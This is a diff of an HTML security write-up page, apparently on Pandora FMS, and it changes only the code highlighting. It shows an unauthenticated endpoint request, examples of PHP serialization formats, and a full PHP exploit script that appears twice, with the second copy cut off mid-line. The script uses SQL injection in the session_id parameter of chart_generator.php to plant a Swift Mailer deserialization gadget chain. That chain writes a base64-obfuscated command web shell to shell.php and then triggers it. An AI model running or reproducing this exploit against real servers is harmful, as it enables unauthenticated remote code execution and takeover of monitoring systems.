+</span></span><span class="line"><span class="cl"><span class="nx">DOMEntityReference</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMProcessingInstruction</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMStringExtend</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMXPath</span>
+</span></span><span class="line"><span class="cl"><span class="nx">finfo</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_sql_exception</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_driver</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_warning</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_result</span>
+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_stmt</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PharException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Phar</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PharData</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PharFileInfo</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SimpleXMLElement</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SimpleXMLIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SNMP</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SNMPException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">XMLReader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">XMLWriter</span>
+</span></span><span class="line"><span class="cl"><span class="nx">XSLTProcessor</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ZipArchive</span>
+</span></span><span class="line"><span class="cl"><span class="nx">StreamReader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">StringReader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">FileReader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">CachedFileReader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">gettext_reader</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PandoraFMS\User</span>
+</span></span><span class="line"><span class="cl"><span class="nx">NetworkMap</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
 <p>I have found an unauthenticated endpoint, but I haven&rsquo;t been able to control the path:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2665,16 +2663,16 @@ NetworkMap
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">GET /pandora_console/include/Image/image_functions.php?getFile=/tmp/test.png<span class="err">&amp;</span>file=tumb_600x400_test.png<span class="err">&amp;</span>thumb=edisc<span class="err">&amp;</span>thumb_size=600x400 HTTP/1.1
-Host: 192.168.159.135
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-DNT: 1
-Connection: close
-Upgrade-Insecure-Requests: 1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">pandora_console</span><span class="o">/</span><span class="k">include</span><span class="o">/</span><span class="nx">Image</span><span class="o">/</span><span class="nx">image_functions</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">getFile</span><span class="o">=/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">test</span><span class="o">.</span><span class="nx">png</span><span class="o">&amp;</span><span class="nx">file</span><span class="o">=</span><span class="nx">tumb_600x400_test</span><span class="o">.</span><span class="nx">png</span><span class="o">&amp;</span><span class="nx">thumb</span><span class="o">=</span><span class="nx">edisc</span><span class="o">&amp;</span><span class="nx">thumb_size</span><span class="o">=</span><span class="mi">600</span><span class="nx">x400</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">159.135</span>
+</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">;</span> <span class="nx">rv</span><span class="o">:</span><span class="mf">109.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">112.0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.5</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DNT</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -2710,7 +2708,7 @@ bytes we can use a similar technique to cause the session file to be a valid Pha
 <p>For the serialization of objects, the data serialized by member variables under different permission modifiers is also different:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2721,43 +2719,43 @@ bytes we can use a similar technique to cause the session file to be a valid Pha
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="k">class</span> <span class="nc">TestClass</span> <span class="p">{</span>
-    <span class="nx">PermissionDecorator</span> <span class="nv">$testMember</span><span class="p">;</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">testMember</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="nv">$data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestClass</span><span class="p">(</span><span class="s2">&#34;edisc12&#34;</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TestClass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">PermissionDecorator</span> <span class="nv">$testMember</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">testMember</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestClass</span><span class="p">(</span><span class="s2">&#34;edisc12&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>public：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">&#34;O:9:&#34;TestClass&#34;:1:{s:10:&#34;testMember&#34;;s:7:&#34;edisc12&#34;;}&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;O:9:&#34;</span><span class="nx">TestClass</span><span class="s2">&#34;:1:{s:10:&#34;</span><span class="nx">testMember</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">edisc12</span><span class="s2">&#34;;}&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>protected：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">&#34;O:9:&#34;TestClass&#34;:1:{s:13:&#34;\x00*\x00testMember&#34;;s:7:&#34;edisc12&#34;;}&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;O:9:&#34;</span><span class="nx">TestClass</span><span class="s2">&#34;:1:{s:13:&#34;</span><span class="nx">\x00</span><span class="o">*</span><span class="nx">\x00testMember</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">edisc12</span><span class="s2">&#34;;}&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>private：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">&#34;O:9:&#34;TestClass&#34;:1:{s:21:&#34;\x00TestClass\x00testMember&#34;;s:7:&#34;edisc12&#34;;}&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;O:9:&#34;</span><span class="nx">TestClass</span><span class="s2">&#34;:1:{s:21:&#34;</span><span class="nx">\x00TestClass\x00testMember</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">edisc12</span><span class="s2">&#34;;}&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></blockquote>
 <ul>
@@ -2766,7 +2764,7 @@ bytes we can use a similar technique to cause the session file to be a valid Pha
 <h5 id="exploit">exploit</h5>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2894,133 +2892,133 @@ bytes we can use a similar technique to cause the session file to be a valid Pha
 </span><span class="lnt">126
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="c1">// include &#39;unserialize.php&#39;;
-</span><span class="c1"></span><span class="nx">session_start</span><span class="p">();</span>
-<span class="k">class</span> <span class="nc">Swift_ByteStream_FileByteStream</span> <span class="k">extends</span> <span class="nx">Swift_ByteStream_AbstractFilterableInputStream</span><span class="p">{}</span>
-
-<span class="k">class</span> <span class="nc">Swift_Events_SimpleEventDispatcher</span><span class="p">{}</span>
-
-<span class="k">class</span> <span class="nc">Swift_Transport_SendmailTransport</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$buffer</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$started</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$eventDispatcher</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">abstract</span> <span class="k">class</span> <span class="nc">Swift_ByteStream_AbstractFilterableInputStream</span><span class="p">{</span>
-
-    <span class="k">private</span> <span class="nv">$filters</span> <span class="o">=</span> <span class="p">[];</span>
-    <span class="k">private</span> <span class="nv">$writeBuffer</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval(base64_decode(&#34;IGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpIHsgc3lzdGVtKCRfR0VUWydjbWQnXSk7IH0g&#34;));?&gt;//&#39;</span><span class="p">;</span>
-  
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">httpGet</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$sessionId</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$status</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
-    <span class="nv">$header</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="p">];</span>
-    <span class="nv">$header</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;Cookie: PHPSESSID=&#39;</span><span class="o">.</span><span class="nv">$sessionId</span><span class="p">;</span>
-    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$header</span><span class="p">);</span>
-    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_PROXY</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">);</span> <span class="c1">//proxy
-</span><span class="c1"></span>    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-    <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span> <span class="c1">// Get the HTTP response code
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$httpCode</span> <span class="o">===</span> <span class="mi">302</span><span class="p">){</span>
-        <span class="nv">$status</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
-    <span class="nx">curl_setopt_array</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="p">[</span>
-        <span class="nx">CURLOPT_POST</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
-        <span class="nx">CURLOPT_HTTPHEADER</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="p">],</span>
-        <span class="nx">CURLOPT_HEADER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
-        <span class="nx">CURLOPT_POSTFIELDS</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
-        <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
-        <span class="nx">CURLOPT_PROXY</span> <span class="o">=&gt;</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">,</span> <span class="c1">//proxy
-</span><span class="c1"></span>    <span class="p">]);</span>
-    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-    <span class="c1">// var_dump($response);
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="s2">&#34;Pandora FMS Graph ( - )&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;[+] Inject payload successful!&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;[!]Inject payload failed!&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span>
-
-    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-    <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">exploit</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span>
-<span class="p">{</span>
-
-    <span class="c1">// Create Swift_Transport_SendmailTransport instance and set its properties
-</span><span class="c1"></span>    <span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_Transport_SendmailTransport</span><span class="p">();</span>
-    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_ByteStream_FileByteStream</span><span class="p">();</span>
-    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="o">-&gt;</span><span class="na">path</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/pandora_console/shell.php&#34;</span><span class="p">;</span>
-    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">buffer</span><span class="o">-&gt;</span><span class="na">mode</span> <span class="o">=</span> <span class="s2">&#34;w+b&#34;</span><span class="p">;</span>
-    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">started</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-    <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">eventDispatcher</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Swift_Events_SimpleEventDispatcher</span><span class="p">();</span>
-
-    <span class="c1">// Set session variables
-</span><span class="c1"></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;alert_msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;new_chat&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
-
-    <span class="c1">// Set the payload instance as session data
-</span><span class="c1"></span>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;vulnClass&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$payload</span><span class="p">;</span>
-
-    <span class="c1">// Encode the session data
-</span><span class="c1"></span>    <span class="nv">$encodedData</span> <span class="o">=</span> <span class="nx">session_encode</span><span class="p">();</span>
-    <span class="c1">// echo PHP_EOL . PHP_EOL . &#34;Encoded session data: &#34; . $encodedData . PHP_EOL;
-</span><span class="c1"></span>
-    <span class="c1">// Decode the session data
-</span><span class="c1"></span>    <span class="nx">session_decode</span><span class="p">(</span><span class="nv">$encodedData</span><span class="p">);</span>
-    <span class="c1">// echo &#34;Decoded session data: &#34; . PHP_EOL;
-</span><span class="c1"></span>
-    <span class="c1">// Send request
-</span><span class="c1"></span>    <span class="k">echo</span> <span class="nx">PHP_EOL</span> <span class="o">.</span> <span class="s2">&#34;[+] Send payload...&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s1">&#39;/pandora_console/include/chart_generator.php&#39;</span><span class="p">;</span>
-    <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;session_id=&#39;</span> <span class="o">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="s1">&#39;xxxxx\&#39; union select \&#39;1\&#39;,0,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$encodedData</span> <span class="o">.</span> <span class="s1">&#39;\&#39; as data#&#39;</span><span class="p">);</span>
-    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-    <span class="c1">// var_dump($response);
-</span><span class="c1"></span>
-    <span class="c1">// Extract session ID from response headers
-</span><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;[+] Extracting PHPSESSID...&#34;</span><span class="p">;</span>
-    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/PHPSESSID=([^\s;]+)/&#39;</span><span class="p">,</span> <span class="nv">$response</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nv">$sessionId</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-        <span class="k">echo</span> <span class="s2">&#34;[+] PHPSESSID = &#34;</span> <span class="o">.</span> <span class="nv">$sessionId</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-
-        <span class="c1">// Trigger payload
-</span><span class="c1"></span>        <span class="k">echo</span> <span class="nx">PHP_EOL</span> <span class="o">.</span> <span class="s2">&#34;[+] Triggering payload...&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s2">&#34;/pandora_console/ws.php&#34;</span><span class="p">;</span>
-        <span class="nv">$status</span> <span class="o">=</span> <span class="nx">httpGet</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$sessionId</span><span class="p">);</span>
-
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">echo</span> <span class="s2">&#34;[+] Exploit successful. Your shell is located at: &#34;</span> <span class="o">.</span> <span class="nv">$host</span> <span class="o">.</span> <span class="s2">&#34;/pandora_console/shell.php&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-            <span class="k">echo</span> <span class="s2">&#34;Exploit failed.&#34;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nv">$argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Usage: php exploit.php &lt;url&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-<span class="k">echo</span> <span class="s2">&#34;Running exploit on </span><span class="si">$url\n</span><span class="s2">&#34;</span><span class="p">;</span>
-<span class="nx">exploit</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
-
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// include &#39;unserialize.php&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Swift_ByteStream_FileByteStream</span> <span class="k">extends</span> <span class="nx">Swift_ByteStream_AbstractFilterableInputStream</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Swift_Events_SimpleEventDispatcher</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Swift_Transport_SendmailTransport</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$started</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$eventDispatcher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">abstract</span> <span class="k">class</span> <span class="nc">Swift_ByteStream_AbstractFilterableInputStream</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$filters</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$writeBuffer</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval(base64_decode(&#34;IGlmKGlzc2V0KCRfR0VUWydjbWQnXSkpIHsgc3lzdGVtKCRfR0VUWydjbWQnXSk7IH0g&#34;));?&gt;//&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">httpGet</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$sessionId</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$status</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$header</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$header</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">&#39;Cookie: PHPSESSID=&#39;</span><span class="o">.</span><span class="nv">$sessionId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$header</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_PROXY</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">);</span> <span class="c1">//proxy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span> <span class="c1">// Get the HTTP response code
